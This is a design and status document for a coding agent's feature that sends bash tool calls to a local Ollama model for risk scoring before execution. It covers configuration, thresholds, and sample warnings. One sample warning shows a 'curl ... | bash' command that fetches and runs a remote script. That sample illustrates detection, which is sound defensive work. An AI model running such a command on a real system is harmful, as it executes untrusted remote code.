# Security Model Validation for Tool Execution

## Status: IMPLEMENTED (Phases 1-3)

All three phases have been implemented. The security model validation feature is available in Codi.

## Overview

This feature allows users to run tool calls (especially bash commands) through a local AI security model before execution. The security model evaluates whether the command is safe to run and provides risk assessment.

## Architecture

### Defense in Depth

The security validation adds a third layer to Codi's tool execution safety:

```
Tool Call Flow:
1. Pattern-based dangerous command detection (existing)
2. AI-powered security model validation (NEW)
3. User confirmation prompt with security warning display
4. Tool execution
```

This maintains defense-in-depth: pattern matching + AI security check + human approval.

### Injection Point

Security validation is injected in `src/agent.ts` after the dangerous pattern check but before user confirmation (~line 1188).

## Configuration

### Basic Configuration

Add to `.codi.json`:
```json
{
  "securityModel": {
    "enabled": true,
    "model": "llama3.2"
  }
}
```

### Full Configuration Options

```json
{
  "securityModel": {
    "enabled": true,
    "model": "llama3.2",
    "blockThreshold": 8,
    "warnThreshold": 5,
    "tools": ["bash"],
    "baseUrl": "http://localhost:11434",
    "timeout": 10000
  }
}
```

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `enabled` | boolean | `false` | Enable security validation |
| `model` | string | `"llama3.2"` | Ollama model to use |
| `blockThreshold` | number | `8` | Risk score (0-10) at which to auto-block |
| `warnThreshold` | number | `5` | Risk score (0-10) at which to show warning |
| `tools` | string[] | `["bash"]` | Tools to validate |
| `baseUrl` | string | `"http://localhost:11434"` | Ollama API URL |
| `timeout` | number | `10000` | Validation timeout in ms |

## Implementation

### Phase 1: Prototype - COMPLETE

**File: `scripts/test-security-model.ts`**

A standalone script for testing AI models' security analysis capabilities:
- Tests commands in 3 categories: safe, dangerous, ambiguous
- Supports model capability detection (chat vs completion-only)
- Robust JSON parsing for malformed LLM outputs
- CLI: `npx tsx scripts/test-security-model.ts [model] [--quick]`

**Model Testing Results:**
- `llama3.2` (3B): 73-100% accuracy, recommended for security validation
- `xploiter/pentester`: Model crashes - avoid using
- Safe commands: Models perform well (88%+)
- Dangerous commands: Good detection with proper prompting
- Ambiguous commands: Most challenging category

### Phase 2: Core Implementation - COMPLETE

**File: `src/security-validator.ts`**

```typescript
export interface SecurityValidationResult {
  allowed: boolean;
  riskScore: number;
  threats: string[];
  reasoning: string;
  recommendation: 'allow' | 'warn' | 'block';
  latencyMs: number;
}

export interface SecurityValidatorConfig {
  enabled: boolean;
  model: string;
  blockThreshold: number;
  warnThreshold: number;
  tools: string[];
  baseUrl: string;
  timeout: number;
}

export class SecurityValidator {
  async validate(toolCall: ToolCall): Promise<SecurityValidationResult>;
  shouldValidate(toolName: string): boolean;
  checkAvailability(): Promise<boolean>;
  isEnabled(): boolean;
  getConfig(): SecurityValidatorConfig;
  updateConfig(config: Partial<SecurityValidatorConfig>): void;
}
```

### Phase 3: Integration - COMPLETE

**Modified Files:**

| File | Changes |
|------|---------|
| `src/security-validator.ts` | Created - Core validation logic |
| `src/agent.ts` | Added `SecurityWarning` interface, integrated validation |
| `src/index.ts` | Added security warning display in confirmation UI |
| `src/config.ts` | Added `securityModel` config schema |
| `tests/security-validator.test.ts` | Created - 14 unit tests |

**Key Behaviors:**
- **Block**: Commands with `riskScore >= blockThreshold` are automatically rejected
- **Warn**: Commands with `riskScore >= warnThreshold` show security warning in confirmation
- **Allow**: Low-risk commands proceed normally
- **Fallback**: If Ollama unavailable, falls back to pattern-based checks only

## Usage

### Prerequisites

1. Install and run Ollama:
   ```bash
   # macOS
   brew install ollama
   ollama serve

   # Pull recommended model
   ollama pull llama3.2
   ```

2. Enable in your project's `.codi.json`:
   ```json
   {
     "securityModel": {
       "enabled": true,
       "model": "llama3.2"
     }
   }
   ```

### What You'll See

When executing bash commands with security validation enabled:

```
🔒 Security Analysis
   Risk: 7/10 (1234ms)
   Threats: Remote code execution, Untrusted source
   Downloads and executes script from untrusted URL...

⚠️  DANGEROUS OPERATION
   Reason: Security model: Downloads and executes script from untrusted URL

Tool: bash
Command: curl http://example.com/script.sh | bash

Approve? [y/N/abort]
```

For high-risk commands (riskScore >= 8), the command is automatically blocked:

```
Security policy blocked this command.
Risk Score: 9/10
Threats: System destruction, Data loss
Reasoning: This command recursively deletes all files from the root directory
```

## Testing

### Unit Tests

```bash
pnpm vitest run tests/security-validator.test.ts
```

14 tests covering:
- Configuration defaults and customization
- `shouldValidate()` logic
- `isEnabled()` state
- `updateConfig()` behavior
- Validation when disabled/unavailable
- Graceful fallback scenarios

### Manual Testing

```bash
# Test the security model directly
npx tsx scripts/test-security-model.ts llama3.2 --quick

# Full test suite
npx tsx scripts/test-security-model.ts llama3.2
```

## Not Implemented (Future Enhancements)

The following features are documented but not yet implemented:

- [ ] **CLI flag**: `--security-model ollama:llama3.2` for ad-hoc enabling
- [ ] **Validation caching**: Cache results for identical commands to reduce latency
- [ ] **Background validation**: Run validation while user reviews, rather than blocking
- [ ] **Multi-provider support**: Support Anthropic, OpenAI as security model providers
- [ ] **Custom prompts**: Allow custom security analysis prompt templates
- [ ] **Per-command overrides**: Skip validation for specific trusted commands
- [ ] **Audit logging**: Log all security validation results for review

## Security Considerations

1. **Local-only by default**: Uses Ollama running locally, no data sent externally
2. **Defense in depth**: Supplements (doesn't replace) existing pattern checks
3. **Human in the loop**: User still confirms even "allowed" commands
4. **Graceful degradation**: Falls back safely if model unavailable
5. **Configurable thresholds**: Adjust sensitivity to your risk tolerance

## Files

| File | Purpose |
|------|---------|
| `src/security-validator.ts` | Core SecurityValidator class |
| `src/agent.ts` | Integration point (~line 1188) |
| `src/config.ts` | Configuration schema |
| `src/index.ts` | UI display for warnings |
| `scripts/test-security-model.ts` | Testing/prototyping script |
| `tests/security-validator.test.ts` | Unit tests |
